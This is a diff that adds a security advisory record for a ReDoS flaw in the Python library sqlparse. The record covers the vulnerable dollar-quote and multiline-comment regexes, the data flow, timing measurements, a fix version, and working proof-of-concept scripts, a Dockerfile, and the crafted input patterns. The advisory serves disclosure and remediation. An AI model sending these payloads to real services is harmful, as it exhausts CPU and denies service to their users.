@@ -1,0 +1,90 @@
+{
+  "id": "GHSA-prg7-hcfm-mfcr",
+  "modified": "2026-08-17T18:00:08.946263924Z",
+  "published": "2026-08-17T17:49:55Z",
+  "aliases": [
+    "CVE-2026-59893"
+  ],
+  "summary": "sqlparse: Inefficient Regex Handling of Dollar-Quoted SQL Literals Leads to ReDoS (Denial of Service)",
+  "details": "### Summary\n\nsqlparse contains a Regular Expression Denial of Service (ReDoS) vulnerability in its dollar-quoted SQL literal lexer. The regex pattern at `sqlparse/keywords.py:33` uses a backreference (`\\1`) to match closing dollar-quote delimiters, causing O(n²) CPU complexity when processing inputs containing many unique, unmatched dollar-quote opening sequences. An attacker who can supply arbitrary SQL text to any application using sqlparse can trigger sustained CPU exhaustion, resulting in a denial of service. No authentication or special privileges are required.\n\n**Scope note:** the same regex shape — a lazy dot-all quantifier terminated by a delimiter, applied at every input position by the lexer loop — is also present in the two multiline-comment patterns. Those are covered by this advisory and by the same fix; see \"Additional affected pattern: multiline comments\" below.\n\n### Details\n\nThe vulnerable regex is defined in `sqlparse/keywords.py` as part of `SQL_REGEX`:\n\n```python\n# sqlparse/keywords.py:33\n(r'((?\u003c![\\w\\\"\\$])\\$(?:[_A-ZÀ-Ü]\\w*)?\\$)[\\s\\S]*?\\1', tokens.Literal),\n```\n\nThis pattern first captures a dollar-quote delimiter (e.g., `$tag$`) into group 1, then attempts to match any characters (`[\\s\\S]*?`) up to the same delimiter again via backreference `\\1`. When no matching closing delimiter exists, the regex engine exhausts the remaining input before concluding there is no match. For a sequence of N unique unmatched openers, each opener triggers a full scan of the remaining string, yielding O(N²) total regex work.\n\nThe lexer applies this regex at every character position (`sqlparse/lexer.py:136-138`):\n\n```python\n# sqlparse/lexer.py:136-138\nfor pos, char in iterable:\n    for rexmatch, action in self._SQL_REGEX:\n        m = rexmatch(text, pos)\n```\n\nThe data flow from public API to the vulnerable sink is:\n\n1. `sqlparse/__init__.py:20` — `parse(sql)` accepts caller-controlled SQL.\n2. `sqlparse/__init__.py:29` — delegates to `parsestream(sql, encoding)`.\n3. `sqlparse/__init__.py:43` — `FilterStack.run(stream, encoding)` is invoked.\n4. `sqlparse/engine/filter_stack.py:31` — `lexer.tokenize(sql, encoding)` is called with no length limit or timeout.\n5. `sqlparse/lexer.py:137` — every regex in `_SQL_REGEX` is tried at the current position.\n6. `sqlparse/keywords.py:33` — the backreference regex performs repeated delimiter searches.\n\nThe `MAX_GROUPING_TOKENS = 10000` limit in `sqlparse/engine/grouping.py:20` fires only after lexing completes and does not bound regex CPU time. There is no input length check, delimiter count check, or regex timeout before the sink.\n\nEmpirically measured scaling confirms super-linear complexity:\n\n| Input (N unique openers) | Bytes  | Elapsed  |\n|--------------------------|--------|----------|\n| 250                      | 1,889  | 0.066 s  |\n| 500                      | 3,889  | 0.144 s  |\n| 1,000                    | 7,889  | 0.397 s  |\n| 2,000                    | 16,889 | 1.314 s  |\n\nThe timing ratio from n=1000 to n=2000 is **3.31×** (input doubled → time tripled), confirming O(n²) growth.\n\n### PoC\n\n**Prerequisites:** Python 3.x with sqlparse installed (tested against version `0.5.6.dev0`, commit `c923da9`).\n\n**Using Docker (isolated reproduction):**\n\n```bash\n# Build from the repository root (parent of vuln-001/)\ndocker build -t sqlparse-vuln001 -f vuln-001/Dockerfile .\n\n# Run with no network access\ndocker run --rm --network=none sqlparse-vuln001\n```\n\n**Direct Python reproduction:**\n\n```python\nimport time\nimport sqlparse\nfrom sqlparse.exceptions import SQLParseError\n\ndef make_payload(n: int) -\u003e str:\n    # N unique unmatched dollar-quote openers — none have a matching closing delimiter\n    return \" \".join(f\"$a{i}$x\" for i in range(n))\n\nfor n in [250, 500, 1000, 2000]:\n    payload = make_payload(n)\n    t0 = time.perf_counter()\n    try:\n        sqlparse.parse(payload)\n        status = \"ok\"\n    except SQLParseError as e:\n        status = f\"SQLParseError: {e}\"\n    elapsed = time.perf_counter() - t0\n    print(f\"n={n:\u003e5}  bytes={len(payload):\u003e7}  elapsed={elapsed:.3f}s  status={status}\")\n```\n\n**Expected output (super-linear scaling confirms ReDoS):**\n\n```\nn=  250  bytes=   1889  elapsed=0.066s  status=ok\nn=  500  bytes=   3889  elapsed=0.144s  status=ok\nn= 1000  bytes=   7889  elapsed=0.397s  status=ok\nn= 2000  bytes=  16889  elapsed=1.314s  status=ok\n\nKey ratio (n=1000 -\u003e n=2000): 3.31x\n[PASS] Super-linear (O(n^2)) scaling CONFIRMED.\n```\n\n**Attack input structure:**\n\n```\n$a0$x $a1$x $a2$x ... $a{N-1}$x\n```\n\nEach token `$ai$x` resembles a PostgreSQL-style dollar-quote opening tag. Because every tag is unique and no closing tag is present, the regex engine must scan to the end of the string for each opener before backtracking.\n\n**Remediation (proposed patch):**\n\nReplace the backreference regex with a deterministic two-pass approach: first locate all delimiter positions with `re.finditer`, then resolve open/close pairs in O(n) time, eliminating catastrophic backtracking entirely. See `report_excerpt.md` for the full diff.\n\n### Additional affected pattern: multiline comments\n\nReported independently as GHSA-3crh-2448-7855 (by @7thParkk) and merged into this advisory: it is the same defect class in the same lexer loop, and it is addressed by the same fix.\n\nTwo further entries in `SQL_REGEX` use the same lazy dot-all shape, terminated by a literal delimiter instead of a backreference:\n\n```python\n# sqlparse/keywords.py:20\n(r'/\\*\\+[\\s\\S]*?\\*/', tokens.Comment.Multiline.Hint),\n# sqlparse/keywords.py:23\n(r'/\\*[\\s\\S]*?\\*/',    tokens.Comment.Multiline),\n```\n\nA backreference is not required to trigger the quadratic behaviour. The cost comes from the lexer retrying every pattern at every input position (`sqlparse/lexer.py:136-138`): an unterminated `/*` scans to the end of the input and fails, so N unclosed openers cost O(N²).\n\n**PoC**\n\n```python\nimport time, sqlparse\n\nfor n in (2000, 4000, 8000, 16000):\n    payload = \"/*x \" * n\n    t0 = time.perf_counter()\n    sqlparse.parse(payload)\n    print(f\"n={n:6d}  bytes={len(payload):7d}  elapsed={time.perf_counter()-t0:.3f}s\")\n```\n\nLexing-only timings on `0.5.6.dev0` (commit `f80af6a`), isolating the regex work from grouping:\n\n| openers | bytes | lexing |\n|---------|-------|--------|\n| 2,000   | 8 KB  | 0.057 s |\n| 4,000   | 16 KB | 0.196 s |\n| 8,000   | 32 KB | 0.729 s |\n| 16,000  | 64 KB | 2.717 s |\n\nRoughly 3.7x per doubling of the input, i.e. quadratic.\n\n**Note for reproduction:** `\"/*\" * n` on its own is *linear* and does not reproduce the issue — in `/*/*/*...` the openers form overlapping `*/` pairs, so the pattern matches immediately. The opener must be padded (e.g. `\"/*x \"`) so that it never closes. A reproduction that only tries the unpadded form will wrongly conclude the issue is not present.\n\n### Impact\n\nThis is a **Regular Expression Denial of Service (ReDoS)** vulnerability. Any application or service that passes user-controlled SQL text to `sqlparse.parse()`, `sqlparse.format()`, or `sqlparse.split()` is affected. No authentication, special configuration, or elevated privileges are required — a single crafted HTTP request (or any other input channel carrying SQL text) is sufficient.\n\nUnder sustained attack, one or more CPU cores can be kept at 100% utilization, degrading or completely blocking service for all other users. Because the grouping-stage token limit fires only after the regex work is done, it provides no protection against this attack.\n\nAffected use cases include: web applications that accept and display or format SQL; database administration tools; ORM query inspectors; SQL linters and formatters exposed as APIs.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM python:3.11-slim\n\n# Install build dependencies\nRUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n    build-essential \\\n    \u0026\u0026 rm -rf /var/lib/apt/lists/*\n\nWORKDIR /app\n\n# Copy the sqlparse repository source code\nCOPY repo/ /app/repo/\n\n# Install sqlparse from local source in editable mode\nRUN pip install --no-cache-dir -e /app/repo/\n\n# Copy the PoC script (build context is the parent of vuln-001/)\nCOPY vuln-001/poc.py /app/poc.py\n\n# Default: run the PoC\nCMD [\"python3\", \"/app/poc.py\"]\n```\n\n#### `poc.py`\n\n```python\n\"\"\"\nPoC: ReDoS in sqlparse dollar-quoted literal regex (VULN-001)\n\nAffected code: sqlparse/keywords.py:33\n    (r'((?\u003c![\\\\w\\\\\"\\\\$])\\\\$(?:[_A-ZÀ-Ü]\\\\w*)?\\\\$)[\\\\s\\\\S]*?\\\\1', tokens.Literal)\n\nThe backreference \\\\1 forces the regex engine to scan the entire remaining input\nfor each unmatched unique dollar-quote delimiter, yielding O(n^2) CPU complexity.\n\nAttack input: a sequence of N unique, never-closed dollar-quote openers\n    $a0$x $a1$x $a2$x ... $a{N-1}$x\n\nEach opener $ai$ is unique, so the regex engine must exhaust the remaining\nstring before concluding no match exists.  With N openers this creates\nO(N^2) regex work.\n\nExpected observation: elapsed time grows quadratically (roughly 4x per 2x N).\nPASS criterion: timing ratio between n=2000 and n=1000 \u003e= 3.0 (clear super-linear).\n\"\"\"\n\nimport sys\nimport time\n\ntry:\n    import sqlparse\n    from sqlparse.exceptions import SQLParseError\nexcept ImportError as exc:\n    print(f\"[ERROR] Cannot import sqlparse: {exc}\", file=sys.stderr)\n    sys.exit(2)\n\nprint(\"=\" * 60)\nprint(\"VULN-001 ReDoS PoC: sqlparse dollar-quoted literal regex\")\nprint(\"=\" * 60)\nprint(f\"sqlparse version: {sqlparse.__version__}\")\nprint()\n\n\ndef make_payload(n: int) -\u003e str:\n    \"\"\"Generate N unique unmatched dollar-quote openers.\n\n    Each token '$ai$x' looks like an opening dollar-quote delimiter\n    but never has a closing delimiter, so the regex engine must scan\n    the entire remaining string before giving up on each one.\n    \"\"\"\n    return \" \".join(f\"$a{i}$x\" for i in range(n))\n\n\nresults = []\n\nsample_sizes = [250, 500, 1000, 2000]\n\nfor n in sample_sizes:\n    payload = make_payload(n)\n    byte_len = len(payload.encode())\n    t_start = time.perf_counter()\n    try:\n        sqlparse.parse(payload)\n        status = \"ok\"\n    except SQLParseError as exc:\n        status = f\"SQLParseError({exc})\"\n    except Exception as exc:\n        status = f\"Exception({type(exc).__name__}: {exc})\"\n    elapsed = time.perf_counter() - t_start\n\n    results.append((n, byte_len, elapsed, status))\n    print(f\"n={n:\u003e5}  bytes={byte_len:\u003e7}  elapsed={elapsed:\u003e8.3f}s  status={status}\")\n\nprint()\n\n# Compute scaling ratios between consecutive sample sizes\nprint(\"Scaling analysis (O(n^2) expected -\u003e ratio \u003e= ~4x per 2x input):\")\nfor i in range(1, len(results)):\n    n_prev, _, t_prev, _ = results[i - 1]\n    n_curr, _, t_curr, _ = results[i]\n    if t_prev \u003e 0:\n        ratio = t_curr / t_prev\n        n_ratio = n_curr / n_prev\n        print(f\"  n={n_prev} -\u003e n={n_curr} (input x{n_ratio:.1f}): time ratio = {ratio:.2f}x\")\n\nprint()\n\n# PASS/FAIL verdict based on timing ratio between largest two points\n_, _, t_1000, _ = results[2]  # n=1000\n_, _, t_2000, _ = results[3]  # n=2000\n\nPASS_THRESHOLD = 3.0\n\nif t_1000 \u003e 0:\n    ratio_1000_2000 = t_2000 / t_1000\nelse:\n    ratio_1000_2000 = 0.0\n\nprint(f\"Key ratio (n=1000 -\u003e n=2000): {ratio_1000_2000:.2f}x\")\n\nif ratio_1000_2000 \u003e= PASS_THRESHOLD:\n    print()\n    print(\"[PASS] Super-linear (O(n^2)) scaling CONFIRMED.\")\n    print(f\"       Time ratio {ratio_1000_2000:.2f}x \u003e= threshold {PASS_THRESHOLD}x.\")\n    print(\"       ReDoS vulnerability in sqlparse dollar-quote regex is REPRODUCED.\")\n    sys.exit(0)\nelse:\n    print()\n    print(\"[FAIL] Super-linear scaling NOT confirmed within this run.\")\n    print(f\"       Time ratio {ratio_1000_2000:.2f}x \u003c threshold {PASS_THRESHOLD}x.\")\n    print(\"       The host may be too fast or JIT effects obscured the result.\")\n    print(\"       Try larger sample sizes or re-run on a slower host.\")\n    sys.exit(1)\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "sqlparse",
+        "purl": "pkg:pypi/sqlparse"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.6.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.18",
+        "0.1.19",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.5.6.dev0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-prg7-hcfm-mfcr/GHSA-prg7-hcfm-mfcr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/andialbrecht/sqlparse/security/advisories/GHSA-prg7-hcfm-mfcr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/andialbrecht/sqlparse/commit/d1d80602741f77ec78e5a04ce4719244cf32352e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/andialbrecht/sqlparse"
+    }
+  ]
+}
